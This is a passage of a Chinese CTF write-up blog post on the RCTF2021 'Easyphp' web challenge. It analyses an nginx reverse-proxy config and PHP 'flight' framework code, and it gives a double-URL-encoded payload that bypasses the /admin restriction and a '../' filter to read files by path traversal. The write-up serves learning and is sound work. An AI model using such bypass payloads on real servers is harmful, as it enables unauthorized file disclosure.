@@ -1,0 +1,985 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"blog.z3ratu1.cn","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="[RCTF2021]挨打记录RCTF2021 web wp，太难了，都不会，纯挨打，null的神仙全部ak，太牛逼了，等神仙的wp ing Easyphp这个题我来的时候就被队里另一个师傅秒了，后来复现的时候发现并没有想象中那么简单，那个师傅也算是误打误撞的猜出了结果，但并没有特别清晰的认识到这个题的原理 赛后认真再看了一下">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[RCTF2021]挨打记录">
+<meta property="og:url" content="https://blog.z3ratu1.cn/[RCTF2021]%E6%8C%A8%E6%89%93%E8%AE%B0%E5%BD%95.html">
+<meta property="og:site_name" content="Z3ratu1&#39;s blog">
+<meta property="og:description" content="[RCTF2021]挨打记录RCTF2021 web wp，太难了，都不会，纯挨打，null的神仙全部ak，太牛逼了，等神仙的wp ing Easyphp这个题我来的时候就被队里另一个师傅秒了，后来复现的时候发现并没有想象中那么简单，那个师傅也算是误打误撞的猜出了结果，但并没有特别清晰的认识到这个题的原理 赛后认真再看了一下">
+<meta property="og:locale">
+<meta property="article:published_time" content="2021-09-14T05:42:21.000Z">
+<meta property="article:modified_time" content="2021-09-21T07:53:21.151Z">
+<meta property="article:author" content="Z3ratu1">
+<meta property="article:tag" content="wp">
+<meta property="article:tag" content="php">
+<meta property="article:tag" content="SQLI">
+<meta property="article:tag" content="nginx">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://blog.z3ratu1.cn/[RCTF2021]%E6%8C%A8%E6%89%93%E8%AE%B0%E5%BD%95.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-Hans'
+  };
+</script>
+
+  <title>[RCTF2021]挨打记录 | Z3ratu1's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Z3ratu1's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">Welcome</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" placeholder="搜索..." spellcheck="false" type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+  <a href="https://github.com/Z3ratu1" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="external nofollow noopener noreferrer" target="_blank"><svg width="80" height="80" viewbox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="https://blog.z3ratu1.cn/[RCTF2021]%E6%8C%A8%E6%89%93%E8%AE%B0%E5%BD%95.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://q2.qlogo.cn/headimg_dl?dst_uin=1207039417&spec=160">
+      <meta itemprop="name" content="Z3ratu1">
+      <meta itemprop="description" content="与其感慨路难行，不如现在出发">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Z3ratu1's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          [RCTF2021]挨打记录
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-09-14 13:42:21" itemprop="dateCreated datePublished" datetime="2021-09-14T13:42:21+08:00">2021-09-14</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-09-21 15:53:21" itemprop="dateModified" datetime="2021-09-21T15:53:21+08:00">2021-09-21</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" itemprop="url" rel="index"><span itemprop="name">刷题记录</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/%5BRCTF2021%5D%E6%8C%A8%E6%89%93%E8%AE%B0%E5%BD%95.html" class="post-meta-item leancloud_visitors" data-flag-title="[RCTF2021]挨打记录" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/%5BRCTF2021%5D%E6%8C%A8%E6%89%93%E8%AE%B0%E5%BD%95.html#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/%5BRCTF2021%5D%E6%8C%A8%E6%89%93%E8%AE%B0%E5%BD%95.html" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="RCTF2021-挨打记录"><a href="#RCTF2021-挨打记录" class="headerlink" title="[RCTF2021]挨打记录"></a>[RCTF2021]挨打记录</h1><p>RCTF2021 web wp，太难了，都不会，纯挨打，null的神仙全部ak，太牛逼了，等神仙的wp ing</p>
+<h2 id="Easyphp"><a href="#Easyphp" class="headerlink" title="Easyphp"></a>Easyphp</h2><p>这个题我来的时候就被队里另一个师傅秒了，后来复现的时候发现并没有想象中那么简单，那个师傅也算是误打误撞的猜出了结果，但并没有特别清晰的认识到这个题的原理</p>
+<p>赛后认真再看了一下</p>
+<h3 id="nginx-conf"><a href="#nginx-conf" class="headerlink" title="nginx.conf"></a>nginx.conf</h3><p>这个题对外是一个Nginx，反代内网的PHP，PHP用的一个叫flight的框架。先看nginx.conf</p>
+<pre class=" language-nginx"><code class="language-nginx"><span class="token keyword">server</span> <span class="token punctuation">{</span>
+    <span class="token keyword">listen</span>       <span class="token number">80</span><span class="token punctuation">;</span>
+    <span class="token keyword">listen</span>  <span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token number">80</span><span class="token punctuation">;</span>
+    <span class="token keyword">server_name</span>  localhost<span class="token punctuation">;</span>
+
+    <span class="token keyword">root</span>   <span class="token operator">/</span>var<span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token punctuation">;</span>
+    <span class="token keyword">location</span> <span class="token operator">/</span>admin <span class="token punctuation">{</span>
+        <span class="token keyword">allow</span> <span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span><span class="token punctuation">;</span>
+        <span class="token keyword">deny</span> all<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">location</span> <span class="token operator">/</span> <span class="token punctuation">{</span>
+        <span class="token keyword">index</span>  <span class="token keyword">index</span><span class="token punctuation">.</span>php<span class="token punctuation">;</span>
+        <span class="token keyword">try_files</span> <span class="token variable">$uri</span> @phpfpm<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+
+    <span class="token comment" spellcheck="true"># pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000</span>
+    <span class="token comment" spellcheck="true">#</span>
+    <span class="token keyword">location</span> @phpfpm <span class="token punctuation">{</span>
+        <span class="token keyword">include</span>        fastcgi_params<span class="token punctuation">;</span>
+        <span class="token keyword">fastcgi_split_path_info</span> <span class="token operator">^</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token operator">+</span><span class="token operator">?</span>\<span class="token punctuation">.</span>php<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token operator">*</span><span class="token punctuation">)</span>$<span class="token punctuation">;</span>
+        <span class="token keyword">fastcgi_pass</span>   php<span class="token punctuation">:</span><span class="token number">9000</span><span class="token punctuation">;</span>
+        <span class="token keyword">fastcgi_index</span>  <span class="token keyword">index</span><span class="token punctuation">.</span>php<span class="token punctuation">;</span>
+        <span class="token keyword">fastcgi_param</span>  SCRIPT_FILENAME  <span class="token variable">$document_root</span><span class="token operator">/</span><span class="token keyword">index</span><span class="token punctuation">.</span>php<span class="token punctuation">;</span>
+        <span class="token keyword">fastcgi_param</span>  REQUEST_URI  <span class="token variable">$uri</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+</code></pre>
+<p>对Nginx的配置文件不是很熟练，阅读起来百度了好久。。。<br>location这个指令接受各种语法，这里就两项<code>/admin</code>和<code>/</code>，这种类型就是简单的前缀匹配，所以所有以<code>/admin</code>打头的请求只要不是localhost发起的请求，一律403。而<code>/</code>则用来处理剩下的所有请求</p>
+<p>index就是默认页面，请求如果啥都不带就返回index.php<br>这里还有一个<code>try_files</code>语句，请求的时候就去这里尝试，先直接访问请求的$uri文件在本机是否存在，不然就把这个请求转到下面定义的<code>phpfpm</code>处理，而这个nginx服务器上啥都没配，所以稳定丢给内网fpm<br>fastcgi给后端传了两个主要参数，一个SCRIPT_FILENAME，让fpm执行index.php，一个REQUEST_URI，用的是nginx自己解析的这个名为<code>$uri</code>的变量</p>
+<h3 id="flight框架"><a href="#flight框架" class="headerlink" title="flight框架"></a>flight框架</h3><p>先看漏洞点在哪，已删减掉部分无用代码</p>
+<pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">isdanger</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$v</span> <span class="token keyword">as</span> <span class="token variable">$k</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isdanger</span><span class="token punctuation">(</span><span class="token variable">$k</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token function">isdanger</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">,</span><span class="token string">"../"</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token variable">$app</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">before</span><span class="token punctuation">(</span><span class="token string">"start"</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token variable">$_GET</span><span class="token punctuation">,</span><span class="token variable">$_POST</span><span class="token punctuation">,</span><span class="token variable">$_COOKIE</span><span class="token punctuation">,</span><span class="token variable">$_FILES</span><span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isdanger</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"go away hack"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$app</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">route</span><span class="token punctuation">(</span><span class="token string">'/*'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token keyword">global</span> <span class="token variable">$app</span><span class="token punctuation">;</span>
+    <span class="token variable">$request</span> <span class="token operator">=</span> <span class="token variable">$app</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$app</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">"head"</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"head_content"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">url</span><span class="token punctuation">,</span><span class="token string">"login"</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token constant">FALSE</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">"user"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token variable">$app</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">"/login"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    
+<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token variable">$app</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">route</span><span class="token punctuation">(</span><span class="token string">'/admin'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token keyword">global</span> <span class="token variable">$app</span><span class="token punctuation">;</span>
+    <span class="token variable">$request</span> <span class="token operator">=</span> <span class="token variable">$app</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$app</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">"admin"</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string">"data"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"./"</span><span class="token punctuation">.</span><span class="token variable">$request</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">query</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">data</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"body_content"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$app</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">"template"</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token variable">$app</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">route</span><span class="token punctuation">(</span><span class="token string">"POST /login"</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token keyword">global</span> <span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">,</span><span class="token variable">$app</span><span class="token punctuation">;</span>
+    <span class="token variable">$request</span>  <span class="token operator">=</span> <span class="token variable">$app</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">data</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span> <span class="token operator">===</span> <span class="token variable">$username</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$request</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">data</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span> <span class="token operator">===</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">"user"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span>
+        <span class="token variable">$app</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token variable">$app</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">"/login?fail=1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+</code></pre>
+<p>有一个过滤，对所有输入进行了检察，不允许目录穿越。然后是一个匹配全部路径的路由，如果请求的url中没有login，且用户没有登录，就直接重定向到login路由。login路由要成功登录的话必须输入的用户名和密码与其预设的密码强相等，用户名密码是硬编码的，所以这里已经不可能成功登录了<br>admin路由处接受一个GET的data参数，拼一个<code>./</code>后进行模板渲染<br>看一眼模板，这句有用</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h3</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span> <span class="token variable">$data</span> <span class="token punctuation">.</span> <span class="token string">":"</span> <span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h3</span><span class="token punctuation">></span></span></span>
+    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>bg-light border rounded-3<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>code</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">white-space</span><span class="token punctuation">:</span> pre-line</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span> <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>code</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span> <span class="token punctuation">}</span> <span class="token delimiter">?></span>
+</code></pre>
+<p>直接file_get_contents<br>那么目标很明确，想办法访问到admin路由，然后传入一个data读根目录flag</p>
+<h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>先直接给出payload<br><code>/aa/admin%3flogin&amp;data=..%252f..%252f..%252f..%252fflag</code><br>乍一看好像很简单，就二次编码就过去了，所以乱按就有可能做出来<br>但说实话，这里不乱按可能想正常做出来还挺麻烦的</p>
+<p>先来看一下这个框架是如何解析路由的，看到router.php</p>
+<pre class=" language-php"><code class="language-php">    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">route</span><span class="token punctuation">(</span>Request <span class="token variable">$request</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token variable">$url_decoded</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span> <span class="token variable">$request</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">url</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$route</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">current</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$route</span> <span class="token operator">!==</span> <span class="token boolean">false</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$route</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">matchMethod</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">method</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$route</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">matchUrl</span><span class="token punctuation">(</span><span class="token variable">$url_decoded</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">case_sensitive</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                <span class="token keyword">return</span> <span class="token variable">$route</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+
+        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+</code></pre>
+<p><code>$requst-&gt;url</code>来自这段代码</p>
+<pre class=" language-php"><code class="language-php">Request<span class="token punctuation">.</span>php
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+<span class="token string">'url'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'@'</span><span class="token punctuation">,</span> <span class="token string">'%40'</span><span class="token punctuation">,</span> self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">getVar</span><span class="token punctuation">(</span><span class="token string">'REQUEST_URI'</span><span class="token punctuation">,</span> <span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
